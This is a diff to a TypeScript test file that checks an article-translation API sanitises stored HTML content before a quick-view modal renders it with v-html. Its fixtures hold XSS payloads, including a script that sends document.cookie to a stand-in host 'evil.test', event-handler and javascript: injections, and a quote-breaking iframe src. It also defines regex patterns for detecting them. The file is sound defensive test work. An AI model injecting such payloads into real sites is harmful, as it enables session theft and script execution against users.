@@ -18,6 +18,12 @@ import { MySqlDialect } from 'drizzle-orm/mysql-core'
  * the article being processed, of any type; its title is now shown only to
  * readers of that type. The real WHERE clauses are compiled with the MySQL dialect and run
  * against in-memory SQLite tables, as in `article-id-oracle-behavior.test.ts`.
+ *
+ * Both routes also filter `content` on READ (CLAUDE.md: HTML shown with `v-html` passes
+ * `sanitizeHtml` on write *and* on read). "Xem nhanh" (`ArticleQuickViewModal.vue`) puts the
+ * `:lang` route's `content` straight into `v-html`, and the list feeds the translation
+ * editor; a row stored before the write-time filter, or written outside the app, used to
+ * come back verbatim (CHANGELOG § 101).
  */
 
 const { articles, articleTranslations } = await import('../server/db/schema')
@@ -33,6 +39,27 @@ addArticle.run(32, 'document', 'Văn bản nội bộ', 'draft')
 const addTranslation = sqlite.prepare('INSERT INTO article_translations (`id`, `article_id`, `lang_code`, `status`, `title`, `progress`) VALUES (?, ?, ?, ?, ?, ?)')
 addTranslation.run(1, 31, 'en', 'published', 'Ordinary news', 100)
 addTranslation.run(2, 32, 'en', 'ai_draft', 'Internal document', 100)
+
+// Article 33: rows stored with hostile content (as an old row, or one written outside the app, would be).
+const EXECUTABLE = /<\s*(script|object|embed|svg|math|style|form|input|button)\b/i
+const EVENT_HANDLER = /\son[a-z]+\s*=/i
+const DANGEROUS_SCHEME = /(javascript|vbscript|data:text\/html)\s*:/i
+const neutralised = (html: string) => !EXECUTABLE.test(html) && !EVENT_HANDLER.test(html) && !DANGEROUS_SCHEME.test(html)
+const PAYLOADS = [
+  '<p>Xin chào</p><script>fetch("//evil.test/?c="+document.cookie)</script>',
+  '<img src=x onerror="alert(document.domain)">',
+  '<a href="javascript:alert(1)">bấm vào đây</a>',
+  '<svg onload=alert(1)><script>alert(2)</script></svg>',
+  '<p onclick="alert(1)">đoạn</p>',
+  // The shape § 96 left in stored rows: an iframe whose `src` closes its own quote and adds a handler.
+  '<iframe src="https://www.youtube.com/embed/AAAAAAAAAAA?&#34; onload=&#34;alert(1)"></iframe>',
+]
+const CLEAN_HTML = '<h2>Training</h2><p>Hello <strong>world</strong>, <em>welcome</em>.</p>'
+addArticle.run(33, 'news', 'Tin có bản dịch độc', 'published')
+const addTranslationWithContent = sqlite.prepare('INSERT INTO article_translations (`id`, `article_id`, `lang_code`, `status`, `title`, `progress`, `content`) VALUES (?, ?, ?, ?, ?, ?, ?)')
+PAYLOADS.forEach((payload, index) => addTranslationWithContent.run(10 + index, 33, `x${index}`, 'published', `Hostile ${index}`, 100, payload))
+addTranslationWithContent.run(20, 33, 'en', 'published', 'Clean', 100, CLEAN_HTML)
+addTranslationWithContent.run(21, 33, 'de', 'ai_draft', 'Empty', 0, null)
 
 type Row = Record<string, unknown>
 function rowsOf(table: typeof articles | typeof articleTranslations, where: SQL, projection?: Row): Row[] {
@@ -101,4 +128,26 @@ test('bulk translation status shows the current article only to someone who may 
   bulkState.currentArticleId = 31
   bulkState.currentArticleTitle = 'Tin thường'
   assert.equal((await bulkStatus(at(newsReader, 0))).task.currentArticleTitle, 'Tin thường')
+})
+
+test('the one-translation read (Xem nhanh → v-html) serves stored content neutralised', async () => {
+  for (const index of PAYLOADS.keys()) {
+    const { translation } = await one(at(newsReader, 33, `x${index}`))
+    assert.equal(translation.title, `Hostile ${index}`, 'the stored row is the one being served')
+    assert.ok(neutralised(String(translation.content)), `served as-is: ${String(translation.content)}`)
+    assert.ok(neutralised(JSON.stringify(translation)), `a payload left the server in another field: ${JSON.stringify(translation)}`)
+  }
+  assert.match(String((await one(at(newsReader, 33, 'x0'))).translation.content), /Xin chào/, 'the text around the payload survives')
+  assert.equal((await one(at(newsReader, 33, 'en'))).translation.content, CLEAN_HTML, 'legitimate markup is served as written')
+  assert.equal((await one(at(newsReader, 33, 'de'))).translation.content, null, 'no content stays null — the modal shows its own placeholder')
+})
+
+test('the translation list (editor) serves stored content neutralised too', async () => {
+  const { items } = await list(at(newsReader, 33))
+  assert.equal(items.length, PAYLOADS.length + 2)
+  for (const item of items) {
+    assert.ok(item.content == null || neutralised(String(item.content)), `served as-is: ${String(item.content)}`)
+  }
+  assert.equal(items.find(item => item.langCode === 'en')?.content, CLEAN_HTML)
+  assert.equal(items.find(item => item.langCode === 'de')?.content, null)
 })
